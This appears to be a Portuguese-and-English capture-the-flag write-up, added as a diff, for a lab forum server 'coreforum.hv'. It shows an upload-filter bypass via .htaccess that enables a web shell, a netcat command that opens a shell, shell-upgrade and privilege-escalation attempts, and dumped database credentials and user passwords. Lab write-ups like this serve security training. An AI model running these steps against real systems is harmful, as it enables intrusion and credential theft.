@@ -1,0 +1,99 @@
+#+title: Core
+#+author: gabriel
+
+* intro
+Our Anti-Cybercrime team has received information about illegal activities on a hacker forum. The administrator of the forum conducts his shady business here in secret and every day new members are added to the criminal network. Our team suspects that confidential data is stored on the server of this forum. Your task is to infiltrate the forum as a normal user and collect important information about the administrator. This operation requires careful planning and high technical skills. Our goal is to identify digital criminals and ensure the digital security of society.
+
+** urls
+#+begin_src sh
+http://coreforum.hv/
+http://coreforum.hv/
+http://coreforum.hv/add_topic.php
+http://coreforum.hv/add_topic.php
+http://coreforum.hv/add_topic.php
+http://coreforum.hv/add_topic.php
+http://coreforum.hv/add_topic.php
+http://coreforum.hv/add_topic.php
+http://coreforum.hv/addPost.php
+http://coreforum.hv/index.php
+http://coreforum.hv/login.php
+http://coreforum.hv/login.php
+http://coreforum.hv/login.php
+http://coreforum.hv/login.php
+http://coreforum.hv/logout.php
+http://coreforum.hv/profile.php
+http://coreforum.hv/register.html
+http://coreforum.hv/register.php
+http://coreforum.hv/set_session.php
+http://coreforum.hv/set_session.php?id=61
+http://coreforum.hv/set_session.php?id=62
+http://coreforum.hv/set_session.php?id=63
+http://coreforum.hv/set_session.php?id=64
+http://coreforum.hv/set_session.php?id=65
+http://coreforum.hv/set_session.php?id=66
+http://coreforum.hv/set_session.php?id=67
+http://coreforum.hv/set_session.php?id=68
+http://coreforum.hv/set_session.php?id=69
+http://coreforum.hv/set_session.php?id=70
+http://coreforum.hv/set_session.php?id=71
+http://coreforum.hv/set_session.php?id=72
+http://coreforum.hv/set_session.php?id=73
+http://coreforum.hv/show_post.php
+http://coreforum.hv/topics
+http://coreforum.hv/topics/topic1.html
+http://coreforum.hv/topics/topic2.html
+http://coreforum.hv/topics/topic3.html
+http://coreforum.hv/topics/topic4.html
+http://coreforum.hv/uploads
+http://coreforum.hv/uploads
+http://coreforum.hv/uploads/.htaccess
+http://coreforum.hv/uploads/cmd.bypass
+http://coreforum.hv/uploads/cmd.bypass?cmd=ls
+#+end_src
+
+Na funcionalidade de file upload existe um filtro para extensão, fiz alterações no MIME type, FIle signature e mesmo assim não conseguia o upload do web shell php.
+
+Porém ao enviar um arquivo .htaccess com o content
+: AddType application/x-httpd-php .bypass
+
+o bypass no filtro é bem sucedido e a vuln command injection foi encontrada ->
+: http://coreforum.hv/uploads/cmd.bypass?cmd=ls
+
+
+
+*rodar na aplicação* ->
+: nc -lvnp 1337 -e /bin/bash
+
+*to get bash* ->
+: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+*xterm para funcionar corretamente* ->
+: export TERM=xterm
+
+*permissao do www-data user sem password* ->
+: sudo /usr/sbin/iftop
+
+porém o iftop está com algumas opções perigosas para segurança como espace shell desativada, então será necessário outro caminho
+
+Sabendo da existência do banco de dados, utilizando este grep buscarei por alguma coisa com password no dir da aplicação ->
+: grep -ri "password" /var/www/html/
+
+#+begin_src sh
+www-data@debian:/var/www/html/uploads$ cat /var/www/html/dbconnect.php
+<?php
+
+$servername = "localhost";
+$db_username = "root";
+$db_password = "mUsQ6kQ6L86yRnzD";
+$dbname = "hacker";
+#+end_src
+
+#+begin_src sh
+mysql> select * from users;
++----+----------+------------------+
+| id | username | password         |
++----+----------+------------------+
+|  1 | admin    | LrEVgETDEUDVAdCa |
+| 13 | jon      | jonadmin         |
++----+----------+------------------+
+#+end_src
